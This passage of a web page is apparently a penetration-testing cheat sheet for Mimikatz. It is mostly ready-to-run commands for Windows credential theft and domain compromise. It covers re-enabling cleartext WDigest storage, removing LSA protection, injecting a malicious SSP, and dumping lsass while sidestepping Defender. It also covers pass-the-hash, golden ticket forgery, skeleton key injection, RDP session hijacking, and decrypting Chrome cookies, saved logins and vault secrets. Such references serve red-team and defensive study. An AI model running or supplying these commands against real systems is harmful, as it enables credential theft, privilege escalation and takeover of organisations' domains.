<p>Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> sekurlsa::logonPasswords full
</span></span><span style="display:flex;"><span>mimikatz_command <span style="color:#f92672">-f</span> sekurlsa::wdigest
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># to re-enable wdigest in Windows Server 2012+</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># in HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># create a DWORD &#39;UseLogonCredential&#39; with the value 1.</span>
</span></span><span style="display:flex;"><span>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>:warning: To take effect, conditions are required :</p>
<ul>
<li>Win7 / 2008R2 / 8 / 2012 / 8.1 / 2012R2:
<ul>
<li>Adding requires lock</li>
<li>Removing requires signout</li>
</ul>
</li>
<li>Win10:
<ul>
<li>Adding requires signout</li>
<li>Removing requires signout</li>
</ul>
</li>
<li>Win2016:
<ul>
<li>Adding requires lock</li>
<li>Removing requires reboot</li>
</ul>
</li>
</ul>
<h2 id="mimikatz---lsa-protection-workaround">
  Mimikatz - LSA Protection Workaround
  <a class="anchor" href="#mimikatz---lsa-protection-workaround">#</a>
</h2>
<ul>
<li>
<p>LSA as a Protected Process (RunAsPPL)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check if LSA runs as a protected process by looking if the variable &#34;RunAsPPL&#34; is set to 0x1</span>
</span></span><span style="display:flex;"><span>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now lets import the mimidriver.sys to the system</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># !+</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now lets remove the protection flags from lsass.exe process</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># !processprotect /process:lsass.exe /remove</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Finally run the logonpasswords function to dump lsass</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># privilege::debug    </span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># token::elevate</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::logonpasswords</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now lets re-add the protection flags to the lsass.exe process</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># !processprotect /process:lsass.exe</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unload the service created</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># !-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/itm4n/PPLdump</span>
</span></span><span style="display:flex;"><span>PPLdump.exe [-v] [-d] [<span style="color:#f92672">-f</span>] &lt;PROC_NAME|PROC_ID&gt; &lt;DUMP_FILE&gt;
</span></span><span style="display:flex;"><span>PPLdump.exe lsass.exe lsass.dmp
</span></span><span style="display:flex;"><span>PPLdump.exe -v <span style="color:#ae81ff">720</span> out.dmp
</span></span></code></pre></div></li>
<li>
<p>LSA is running as virtualized process (LSAISO) by <strong>Credential Guard</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check if a process called lsaiso.exe exists on the running processes</span>
</span></span><span style="display:flex;"><span>tasklist |findstr lsaiso
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lets inject our own malicious Security Support Provider into memory</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># require mimilib.dll in the same folder</span>
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># misc::memssp</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span>
</span></span></code></pre></div></li>
</ul>
<h2 id="mimikatz---mini-dump">
  Mimikatz - Mini Dump
  <a class="anchor" href="#mimikatz---mini-dump">#</a>
</h2>
<p>Dump the lsass process with <code>procdump</code></p>
<blockquote>
<p>Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass&rsquo;s process identifier (pid) &ldquo;bypasses&rdquo; that.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># HTTP method - using the default way</span>
</span></span><span style="display:flex;"><span>certutil -urlcache -split <span style="color:#f92672">-f</span> http<span style="color:#960050;background-color:#1e0010">:</span>//live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
</span></span><span style="display:flex;"><span>C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># SMB method - using the pid</span>
</span></span><span style="display:flex;"><span>net use Z: https<span style="color:#960050;background-color:#1e0010">:</span>//live.sysinternals.com
</span></span><span style="display:flex;"><span>tasklist /fi <span style="color:#e6db74">&#34;imagename eq lsass.exe&#34;</span> <span style="color:#75715e"># Find lsass&#39;s pid</span>
</span></span><span style="display:flex;"><span>Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
</span></span></code></pre></div><p>Dump the lsass process with <code>rundll32</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
</span></span></code></pre></div><p>Then load it inside Mimikatz.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::minidump lsass.dmp</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Switch</span> to minidump
</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::logonPasswords</span>
</span></span></code></pre></div><h2 id="mimikatz---pass-the-hash">
  Mimikatz - Pass The Hash
  <a class="anchor" href="#mimikatz---pass-the-hash">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell</span>
</span></span></code></pre></div><h2 id="mimikatz---golden-ticket">
  Mimikatz - Golden ticket
  <a class="anchor" href="#mimikatz---golden-ticket">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\mimikatz kerberos::golden /admin<span style="color:#960050;background-color:#1e0010">:</span>ADMINACCOUNTNAME /domain<span style="color:#960050;background-color:#1e0010">:</span>DOMAINFQDN /id<span style="color:#960050;background-color:#1e0010">:</span>ACCOUNTRID /sid<span style="color:#960050;background-color:#1e0010">:</span>DOMAINSID /krbtgt<span style="color:#960050;background-color:#1e0010">:</span>KRBTGTPASSWORDHASH /ptt
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\mimikatz <span style="color:#e6db74">&#34;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&#34;</span> exit
</span></span></code></pre></div><h2 id="mimikatz---skeleton-key">
  Mimikatz - Skeleton key
  <a class="anchor" href="#mimikatz---skeleton-key">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug
</span></span><span style="display:flex;"><span>misc::skeleton
</span></span><span style="display:flex;"><span><span style="color:#75715e"># map the share</span>
</span></span><span style="display:flex;"><span>net use p: \\WIN-PTELU2U07KG\admin$ /user<span style="color:#960050;background-color:#1e0010">:</span>john mimikatz
</span></span><span style="display:flex;"><span><span style="color:#75715e"># login as someone</span>
</span></span><span style="display:flex;"><span>rdesktop <span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">3389</span> -u test -p mimikatz -d pentestlab
</span></span></code></pre></div><h2 id="mimikatz---rdp-session-takeover">
  Mimikatz - RDP session takeover
  <a class="anchor" href="#mimikatz---rdp-session-takeover">#</a>
</h2>
<p>Use <code>ts::multirdp</code> to patch the RDP service to allow more than two users.</p>
<p>Run tscon.exe as the SYSTEM user, you can connect to any session without a password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>privilege::debug 
</span></span><span style="display:flex;"><span>token::elevate 
</span></span><span style="display:flex;"><span>ts::remote /id<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">2</span> 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># get the Session ID you want to hijack</span>
</span></span><span style="display:flex;"><span>query user
</span></span><span style="display:flex;"><span>create sesshijack binpath= <span style="color:#e6db74">&#34;cmd.exe /k tscon 1 /dest:rdp-tcp#55&#34;</span>
</span></span><span style="display:flex;"><span>net start sesshijack
</span></span></code></pre></div><h2 id="mimikatz---credential-manager--dpapi">
  Mimikatz - Credential Manager &amp; DPAPI
  <a class="anchor" href="#mimikatz---credential-manager--dpapi">#</a>
</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># check the folder to find credentials</span>
</span></span><span style="display:flex;"><span>dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># check the file with mimikatz</span>
</span></span><span style="display:flex;"><span>$ mimikatz dpapi::cred /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># find master key</span>
</span></span><span style="display:flex;"><span>$ mimikatz !sekurlsa::dpapi
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use master key</span>
</span></span><span style="display:flex;"><span>$ mimikatz dpapi::cred /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey<span style="color:#960050;background-color:#1e0010">:</span>95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
</span></span></code></pre></div><h3 id="chrome-cookies--credential">
  Chrome Cookies &amp; Credential
  <a class="anchor" href="#chrome-cookies--credential">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Saved Cookies</span>
</span></span><span style="display:flex;"><span>dpapi::chrome /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;%localappdata%\Google\Chrome\User Data\Default\Cookies&#34;</span> /unprotect
</span></span><span style="display:flex;"><span>dpapi::chrome /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&#34;</span> /masterkey<span style="color:#960050;background-color:#1e0010">:</span>9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Saved Credential in Chrome</span>
</span></span><span style="display:flex;"><span>dpapi::chrome /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;%localappdata%\Google\Chrome\User Data\Default\Login Data&#34;</span> /unprotect
</span></span></code></pre></div><h3 id="task-scheduled-credentials">
  Task Scheduled credentials
  <a class="anchor" href="#task-scheduled-credentials">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mimikatz(commandline) <span style="color:#75715e"># vault::cred /patch</span>
</span></span><span style="display:flex;"><span>TargetName <span style="color:#960050;background-color:#1e0010">:</span> Domain<span style="color:#960050;background-color:#1e0010">:</span>batch=TaskScheduler<span style="color:#960050;background-color:#1e0010">:</span>Task<span style="color:#960050;background-color:#1e0010">:</span>{CF3ABC3E-4B17-ABCD-<span style="color:#ae81ff">0003</span>-A1BA192CDD0B} / &lt;NULL&gt;
</span></span><span style="display:flex;"><span>UserName   <span style="color:#960050;background-color:#1e0010">:</span> DOMAIN\user
</span></span><span style="display:flex;"><span>Comment    <span style="color:#960050;background-color:#1e0010">:</span> &lt;NULL&gt;
</span></span><span style="display:flex;"><span>Type       <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span> - domain_password
</span></span><span style="display:flex;"><span>Persist    <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2</span> - local_machine
</span></span><span style="display:flex;"><span>Flags      <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">00004004</span>
</span></span><span style="display:flex;"><span>Credential <span style="color:#960050;background-color:#1e0010">:</span> XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></span><span style="display:flex;"><span>Attributes <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><h3 id="vault">
  Vault
  <a class="anchor" href="#vault">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>vault::cred /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span>C:\Users\demo\AppData\Local\Microsoft\Vault\<span style="color:#e6db74">&#34;
</span></span></span></code></pre></div><h2 id="mimikatz---commands-list">
  Mimikatz - Commands list
  <a class="anchor" href="#mimikatz---commands-list">#</a>
</h2>
<table>
<thead>
<tr>
<th style="text-align:center">Command</th>
<th style="text-align:left">Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CRYPTO::Certificates</td>
<td style="text-align:left">list/export certificates</td>
</tr>
<tr>
<td style="text-align:center">CRYPTO::Certificates</td>
<td style="text-align:left">list/export certificates</td>
</tr>
<tr>
<td style="text-align:center">KERBEROS::Golden</td>
<td style="text-align:left">create golden/silver/trust tickets</td>
</tr>
<tr>
<td style="text-align:center">KERBEROS::List</td>
<td style="text-align:left">list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.</td>
</tr>
<tr>
<td style="text-align:center">KERBEROS::PTT</td>
<td style="text-align:left">pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).</td>
</tr>
<tr>
<td style="text-align:center">LSADUMP::DCSync</td>
<td style="text-align:left">ask a DC to synchronize an object (get password data for account). No need to run code on DC.</td>
</tr>
<tr>
<td style="text-align:center">LSADUMP::LSA</td>
<td style="text-align:left">Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”</td>
</tr>
<tr>
<td style="text-align:center">LSADUMP::SAM</td>
<td style="text-align:left">get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.</td>
</tr>
<tr>
<td style="text-align:center">LSADUMP::Trust</td>
<td style="text-align:left">Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).</td>
</tr>
<tr>
<td style="text-align:center">MISC::AddSid</td>
<td style="text-align:left">Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.</td>
</tr>
<tr>
<td style="text-align:center">MISC::MemSSP</td>
<td style="text-align:left">Inject a malicious Windows SSP to log locally authenticated credentials.</td>
</tr>
<tr>
<td style="text-align:center">MISC::Skeleton</td>
<td style="text-align:left">Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.</td>
</tr>
<tr>
<td style="text-align:center">PRIVILEGE::Debug</td>
<td style="text-align:left">get debug rights (this or Local System rights is required for many Mimikatz commands).</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::Ekeys</td>
<td style="text-align:left">list Kerberos encryption keys</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::Kerberos</td>
<td style="text-align:left">List Kerberos credentials for all authenticated users (including services and computer account)</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::Krbtgt</td>
<td style="text-align:left">get Domain Kerberos service account (KRBTGT)password data</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::LogonPasswords</td>
<td style="text-align:left">lists all available provider credentials. This usually shows recently logged on user and computer credentials.</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::Pth</td>
<td style="text-align:left">Pass- theHash and Over-Pass-the-Hash</td>
</tr>
<tr>
<td style="text-align:center">SEKURLSA::Tickets</td>
<td style="text-align:left">Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).</td>
</tr>
<tr>
<td style="text-align:center">TOKEN::List</td>
<td style="text-align:left">list all tokens of the system</td>
</tr>
<tr>
<td style="text-align:center">TOKEN::Elevate</td>
<td style="text-align:left">impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box</td>
</tr>
<tr>
<td style="text-align:center">TOKEN::Elevate /domainadmin</td>
<td style="text-align:left">impersonate a token with Domain Admin credentials.</td>
</tr>
</tbody>
</table>
<h2 id="mimikatz---powershell-version">
  Mimikatz - Powershell version
  <a class="anchor" href="#mimikatz---powershell-version">#</a>
</h2>
<p>Mimikatz in memory (no binary on disk) with :</p>
<ul>
<li><a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a> from PowerShellEmpire</li>
<li><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a> from PowerSploit</li>
</ul>
<p>More information can be grabbed from the Memory with :</p>
<ul>
<li><a href="https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1">Invoke-Mimikittenz</a></li>
</ul>
<h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://adsecurity.org/?page_id=1821">Unofficial Guide to Mimikatz &amp; Command Reference</a></li>
<li><a href="https://pentestlab.blog/2018/04/10/skeleton-key/">Skeleton Key</a></li>
<li><a href="https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/">Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>December 10, 2022</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#windows---mimikatz">Windows - Mimikatz</a>
      <ul>
        <li><a href="#mimikatz---execute-commands">Mimikatz - Execute commands</a></li>
        <li><a href="#mimikatz---extract-passwords">Mimikatz - Extract passwords</a></li>
        <li><a href="#mimikatz---lsa-protection-workaround">Mimikatz - LSA Protection Workaround</a></li>
        <li><a href="#mimikatz---mini-dump">Mimikatz - Mini Dump</a></li>
        <li><a href="#mimikatz---pass-the-hash">Mimikatz - Pass The Hash</a></li>
        <li><a href="#mimikatz---golden-ticket">Mimikatz - Golden ticket</a></li>
        <li><a href="#mimikatz---skeleton-key">Mimikatz - Skeleton key</a></li>
        <li><a href="#mimikatz---rdp-session-takeover">Mimikatz - RDP session takeover</a></li>
        <li><a href="#mimikatz---credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a>
          <ul>
            <li><a href="#chrome-cookies--credential">Chrome Cookies &amp; Credential</a></li>
            <li><a href="#task-scheduled-credentials">Task Scheduled credentials</a></li>
            <li><a href="#vault">Vault</a></li>
          </ul>
        </li>
        <li><a href="#mimikatz---commands-list">Mimikatz - Commands list</a></li>
        <li><a href="#mimikatz---powershell-version">Mimikatz - Powershell version</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












